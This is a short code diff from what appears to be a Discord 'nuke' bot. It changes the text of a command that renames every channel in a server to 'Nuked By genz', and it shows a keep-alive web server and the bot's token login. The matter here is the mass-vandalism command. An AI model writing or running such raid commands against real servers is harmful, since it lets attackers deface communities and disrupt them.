@@ -154,11 +154,11 @@ if (command === "renamechannal") {
 
   await message.reply("🔄 Renaming all channels to genz...");
 
-await Promise.all(
-  message.guild.channels.cache.map(channel =>
-    channel.setName("『 Nuked By genz 』").catch(() => {})
-  )
-);
+  await Promise.all(
+    message.guild.channels.cache.map(channel =>
+      channel.setName("「 ⋆༺𓆩☠︎︎𓆪༻⋆ 」Nuked By genz!").catch(() => {})
+    )
+  );
     const express = require("express");
 const app = express();
 
@@ -169,7 +169,8 @@ app.get("/", (req, res) => {
 app.listen(3000, () => {
   console.log("Web server running...");
 });
-  
+
 client.login(process.env.TOKEN);
+
 
 
